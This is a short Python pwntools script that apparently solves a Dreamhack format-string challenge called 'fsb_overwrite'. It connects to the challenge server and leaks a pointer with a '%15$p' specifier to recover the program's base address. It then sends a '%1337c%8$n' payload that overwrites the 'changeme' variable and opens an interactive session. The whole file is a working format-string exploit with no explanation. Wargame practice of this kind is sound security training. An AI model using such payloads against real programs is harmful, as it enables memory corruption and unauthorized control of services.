from pwn import *
# p = process("./fsb_overwrite")
p = connect("host3.dreamhack.games", 16593)
e = ELF("./fsb_overwrite")

fstring = b"%15$p"
p.sendline(fstring)
leaked = int(p.recvline()[:-1], 16)
codebase = leaked - e.symbols['main']
changeme = codebase + e.symbols['changeme']
print(changeme)
fstring = b'%1337c%8' + b'$nAAAAAA' + p64(changeme)
p.send(fstring)
p.interactive()